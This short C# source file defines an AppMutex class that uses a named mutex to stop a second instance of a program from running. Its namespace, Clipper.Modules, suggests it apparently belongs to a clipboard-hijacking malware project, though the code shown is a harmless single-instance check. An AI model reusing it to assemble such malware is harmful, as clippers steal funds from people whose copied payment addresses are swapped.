using System;
using System.Threading;

namespace Clipper.Modules
{
    class AppMutex
    {
       
        public static void Check()
        {
            bool createdNew = false;
            
            Mutex currentApp = new Mutex(false, config.mutex, out createdNew);
            if (!createdNew)
                Environment.Exit(1);
        }
    }
}
